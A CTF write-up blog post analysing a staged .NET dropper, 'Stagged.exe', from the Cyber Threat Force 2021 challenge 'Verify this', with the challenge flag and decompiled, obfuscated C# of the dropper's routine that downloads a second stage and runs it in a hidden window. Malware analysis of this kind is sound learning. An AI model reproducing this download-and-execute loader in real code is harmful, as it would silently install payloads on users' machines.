<!doctype html><html lang=en>
<head>
<title>Writeup Cyber Threat Force : Verify this :: Nicolas Bourras</title>
<meta charset=utf-8>
<meta name=viewport content="width=device-width,initial-scale=1">
<meta name=description content="For this challenge, we were given a Stagged.exe executable. Before running it on our machine, we can try to run it against hybrid analysis, an online malware analysis service.
Here is the link to the full report.
We can see in the &amp;ldquo;Network Analysis&amp;rdquo; tab that the program made two requests:
HTTP Traffic&amp;rdquo; part of the report&#34;
Trying to download the first image gives us a PE file. If we upload it again, we see that it also makes a request to /ordertoexecute.">
<meta name=keywords content>
<meta name=robots content="noodp">
<link rel=canonical href=https://nicolasb.fr/blog/writeup-cyber-threat-force-2021-reverse-verify-this/>
<link rel=stylesheet href=https://nicolasb.fr/assets/style.css>
<link rel=stylesheet href=https://nicolasb.fr/assets/pink.css>
<link rel=apple-touch-icon href=https://nicolasb.fr/img/apple-touch-icon-192x192.png>
<link rel="shortcut icon" href=https://nicolasb.fr/img/favicon/pink.png>
<meta name=twitter:card content="summary">
<meta name=twitter:creator content>
<meta property="og:locale" content="en">
<meta property="og:type" content="article">
<meta property="og:title" content="Writeup Cyber Threat Force : Verify this">
<meta property="og:description" content="For this challenge, we were given a Stagged.exe executable. Before running it on our machine, we can try to run it against hybrid analysis, an online malware analysis service.
Here is the link to the full report.
We can see in the &amp;ldquo;Network Analysis&amp;rdquo; tab that the program made two requests:
HTTP Traffic&amp;rdquo; part of the report&#34;
Trying to download the first image gives us a PE file. If we upload it again, we see that it also makes a request to /ordertoexecute.">
<meta property="og:url" content="https://nicolasb.fr/blog/writeup-cyber-threat-force-2021-reverse-verify-this/">
<meta property="og:site_name" content="Nicolas Bourras">
<meta property="og:image" content="https://nicolasb.fr/img/favicon/pink.png">
<meta property="og:image:width" content="2048">
<meta property="og:image:height" content="1024">
<meta property="article:published_time" content="2021-07-10 00:00:09 +0100 +0100">
</head>
<body class=pink>
<div class="container center">
<header class=header>
<div class=header__inner>
<div class=header__logo>
<a href=/>
<div class=logo>
Nicolas Bourras
</div>
</a>
</div>
<div class=menu-trigger>menu</div>
</div>
<nav class=menu>
<ul class="menu__inner menu__inner--desktop">
<li><a href=/>About</a></li>
<li><a href=/blog>Blog</a></li>
<li><a href=/recipes>Recipes</a></li>
</ul>
<ul class="menu__inner menu__inner--mobile">
<li><a href=/>About</a></li>
<li><a href=/blog>Blog</a></li>
<li><a href=/recipes>Recipes</a></li>
</ul>
</nav>
</header>
<div class=content>
<div class=post>
<h1 class=post-title>
<a href=https://nicolasb.fr/blog/writeup-cyber-threat-force-2021-reverse-verify-this/>Writeup Cyber Threat Force : Verify this</a></h1>
<div class=post-meta>
<span class=post-date>
2021-07-10
</span>
</div>
<span class=post-tags>
#<a href=https://nicolasb.fr/tags/blog/>blog</a>&nbsp;
#<a href=https://nicolasb.fr/tags/security/>security</a>&nbsp;
#<a href=https://nicolasb.fr/tags/ctf/>ctf</a>&nbsp;
#<a href=https://nicolasb.fr/tags/cyber-threat-force/>cyber-threat-force</a>&nbsp;
#<a href=https://nicolasb.fr/tags/reverse/>reverse</a>&nbsp;
</span>
<div class=post-content><div>
<p>For this challenge, we were given a <code>Stagged.exe</code> executable. Before running it on our machine, we can try to run it against hybrid analysis, an online malware analysis service.</p>
<p>Here is the <a href=https://www.hybrid-analysis.com/sample/1a071c52e1c94be73f9a2aef069629d61b100e4a52701c7c0921f50211daa6e7/60e138f4125bb815b6267895>link to the full report</a>.</p>
<p>We can see in the &ldquo;Network Analysis&rdquo; tab that the program made two requests:</p>
<p><img src=/assets/cyber-threat-force/reverse-verify-this-hybrid-analysis.png alt="Screenshot of the &ldquo;Network Analysis > HTTP Traffic&rdquo; part of the report"></p>
<p>Trying to download the first image gives us a PE file. If we upload it again, we see that it also makes a request to <code>/ordertoexecute.gif</code>, so we can assume that <code>Stagged.exe</code> doesn&rsquo;t contain the &ldquo;main&rdquo; code, <code>index.jpg</code> does.</p>
<p>The name of the binary is fitting: <code>Stagged.exe</code> probably refers to a &ldquo;staged&rdquo; malware, which downloads one or more stages that contains the actual nefarious code.</p>
<p>We can take a look at the second image:</p>
<p><img src=/assets/cyber-threat-force/ordertoexecute.gif alt="The second image, a GIF from star wars"></p>
<p>Now this is where I stopped when I was doing the CTF. I tried a few steganography tools but none worked. <a href=https://www.root-me.org/nobodyisnobody>Nobodyisnobody</a> found the tool that you had to use: <a href=http://manpages.ubuntu.com/manpages/bionic/man1/stegosuite.1.html>stegosuite</a>.</p>
<img src=/assets/cyber-threat-force/stego-suite.png alt="Stegosuite extracting the flag" class=center>
<p>The flag was <code>CYBERTF{Gr3at_J0b_Ag3nt}</code>.</p>
<hr>
<p>When I did not find any message encoded in the image, I started looking at the binary itself. It&rsquo;s a Mono/.Net program, probably obfuscated using something like <a href=https://www.gapotchenko.com/eazfuscator.net>Eazfuscator</a>. I say that because <a href=https://github.com/icsharpcode/ILSpy>ILSpy</a>, a .NET decompiler, spits out mangled function names, encoded strings, &mldr;</p>
<p>The function responsible for downloading the second stage is this one:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cs data-lang=cs><span style=color:#75715e>// \u0005\u2000
</span><span style=color:#75715e></span><span style=color:#66d9ef>using</span> System;
<span style=color:#66d9ef>using</span> System.Diagnostics;
<span style=color:#66d9ef>using</span> System.Net;
<span style=color:#66d9ef>using</span> System.Threading;

<span style=color:#66d9ef>internal</span> <span style=color:#66d9ef>sealed</span> <span style=color:#66d9ef>class</span> <span style=color:#960050;background-color:#1e0010>\</span>u0005<span style=color:#960050;background-color:#1e0010>\</span>u2000
{
        <span style=color:#66d9ef>private</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>void</span> <span style=color:#960050;background-color:#1e0010>\</span>u0002(<span style=color:#66d9ef>string</span>[] <span style=color:#960050;background-color:#1e0010>\</span>u0002)
        {
            <span style=color:#66d9ef>if</span> (<span style=color:#960050;background-color:#1e0010>\</span>u0003.<span style=color:#960050;background-color:#1e0010>\</span>u0002())
            {
                <span style=color:#66d9ef>string</span> text = <span style=color:#960050;background-color:#1e0010>\</span>u0008<span style=color:#960050;background-color:#1e0010>\</span>u2000.<span style=color:#960050;background-color:#1e0010>\</span>u0002(<span style=color:#ae81ff>1179443472</span>) + Environment.UserName + <span style=color:#960050;background-color:#1e0010>\</span>u0008<span style=color:#960050;background-color:#1e0010>\</span>u2000.<span style=color:#960050;background-color:#1e0010>\</span>u0002(<span style=color:#ae81ff>1179443456</span>);
                <span style=color:#66d9ef>string</span> text2 = <span style=color:#960050;background-color:#1e0010>\</span>u0008<span style=color:#960050;background-color:#1e0010>\</span>u2000.<span style=color:#960050;background-color:#1e0010>\</span>u0002(<span style=color:#ae81ff>1179443518</span>);
                <span style=color:#66d9ef>string</span> text3 = <span style=color:#960050;background-color:#1e0010>\</span>u0008<span style=color:#960050;background-color:#1e0010>\</span>u2000.<span style=color:#960050;background-color:#1e0010>\</span>u0002(<span style=color:#ae81ff>1179443500</span>);
                <span style=color:#66d9ef>string</span> text4 = <span style=color:#960050;background-color:#1e0010>\</span>u0008<span style=color:#960050;background-color:#1e0010>\</span>u2000.<span style=color:#960050;background-color:#1e0010>\</span>u0002(<span style=color:#ae81ff>1179443570</span>);
                <span style=color:#66d9ef>string</span> text5 = <span style=color:#66d9ef>null</span>;
                WebClient webClient = <span style=color:#66d9ef>new</span> WebClient();
                webClient.Headers.Set(<span style=color:#960050;background-color:#1e0010>\</span>u0008<span style=color:#960050;background-color:#1e0010>\</span>u2000.<span style=color:#960050;background-color:#1e0010>\</span>u0002(<span style=color:#ae81ff>1179443554</span>), <span style=color:#960050;background-color:#1e0010>\</span>u0008<span style=color:#960050;background-color:#1e0010>\</span>u2000.<span style=color:#960050;background-color:#1e0010>\</span>u0002(<span style=color:#ae81ff>1179443863</span>));
                webClient.Headers.Add(<span style=color:#960050;background-color:#1e0010>\</span>u0008<span style=color:#960050;background-color:#1e0010>\</span>u2000.<span style=color:#960050;background-color:#1e0010>\</span>u0002(<span style=color:#ae81ff>1179443847</span>), <span style=color:#960050;background-color:#1e0010>\</span>u0008<span style=color:#960050;background-color:#1e0010>\</span>u2000.<span style=color:#960050;background-color:#1e0010>\</span>u0002(<span style=color:#ae81ff>1179443894</span>));
                webClient.Headers.Add(<span style=color:#960050;background-color:#1e0010>\</span>u0008<span style=color:#960050;background-color:#1e0010>\</span>u2000.<span style=color:#960050;background-color:#1e0010>\</span>u0002(<span style=color:#ae81ff>1179443964</span>), <span style=color:#960050;background-color:#1e0010>\</span>u0008<span style=color:#960050;background-color:#1e0010>\</span>u2000.<span style=color:#960050;background-color:#1e0010>\</span>u0002(<span style=color:#ae81ff>1179443734</span>));
                webClient.Headers.Add(<span style=color:#960050;background-color:#1e0010>\</span>u0008<span style=color:#960050;background-color:#1e0010>\</span>u2000.<span style=color:#960050;background-color:#1e0010>\</span>u0002(<span style=color:#ae81ff>1179443719</span>), <span style=color:#960050;background-color:#1e0010>\</span>u0008<span style=color:#960050;background-color:#1e0010>\</span>u2000.<span style=color:#960050;background-color:#1e0010>\</span>u0002(<span style=color:#ae81ff>1179443769</span>));
                text5 = text3 + text4;
                webClient.DownloadFile(text5, text + <span style=color:#960050;background-color:#1e0010>\</span>u0008<span style=color:#960050;background-color:#1e0010>\</span>u2000.<span style=color:#960050;background-color:#1e0010>\</span>u0002(<span style=color:#ae81ff>1179443757</span>) + text2);
                Thread.Sleep(<span style=color:#ae81ff>36000</span>);
                Process.Start(<span style=color:#66d9ef>new</span> ProcessStartInfo
                {
                        CreateNoWindow = <span style=color:#66d9ef>true</span>,
                        UseShellExecute = <span style=color:#66d9ef>false</span>,
                        FileName = text + <span style=color:#960050;background-color:#1e0010>\</span>u0008<span style=color:#960050;background-color:#1e0010>\</span>u2000.<span style=color:#960050;background-color:#1e0010>\</span>u0002(<span style=color:#ae81ff>1179443757</span>) + text2,
                        WindowStyle = ProcessWindowStyle.Hidden
                });
            }
        }
}
</code></pre></div><p>Now I could also have analyzed the second stage, a Go binary, but it is quite fat (6mb), so I stopped there.</p>
<hr>
<p>You can <a href=https://github.com/vivescere/ctf/tree/main/cyber-threat-force-2021/reverse/verify-this>view the sources on github</a> or <a href=/blog/cyber-threat-force-ctf/>read other writeups</a>.</p>
</div></div>
<div class=pagination>
<div class=pagination__title>
<span class=pagination__title-h>Read other posts</span>
<hr>
</div>
<div class=pagination__buttons>
<span class="button previous">
<a href=https://nicolasb.fr/blog/writeup-cyber-threat-force-2021-reverse-smasher/>
<span class=button__icon>←</span>
<span class=button__text>Writeup Cyber Threat Force : Smasher</span>
</a>
</span>
<span class="button next">
<a href=https://nicolasb.fr/blog/writeup-cyber-threat-force-2021-forensic-welcome-to-the-matrix/>
<span class=button__text>Writeup Cyber Threat Force : Welcome to the matrix</span>
<span class=button__icon>→</span>
</a>
</span>
</div>
</div>
</div>
</div>
<footer class=footer>
<div class=footer__inner>
<div class=copyright>
<span>© 2021 Powered by <a href=http://gohugo.io>Hugo</a></span>
<span>:: Theme made by <a href=https://twitter.com/panr>panr</a></span>
</div>
</div>
</footer>
<script src=https://nicolasb.fr/assets/main.js></script>
<script src=https://nicolasb.fr/assets/prism.js></script>
</div>
</body>
</html>